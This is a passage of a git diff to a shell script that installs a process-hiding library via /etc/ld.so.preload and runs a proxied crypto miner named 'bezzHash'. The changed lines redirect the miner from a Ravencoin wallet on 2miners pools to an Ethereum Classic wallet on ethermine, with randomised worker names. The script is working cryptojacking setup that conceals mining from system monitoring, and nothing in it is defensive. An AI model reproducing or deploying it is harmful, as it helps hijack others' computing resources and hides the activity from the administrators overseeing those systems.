@@ -42,18 +42,18 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX 
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX 
 
-./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia1-etc.ethermine.org:4444 --ocX
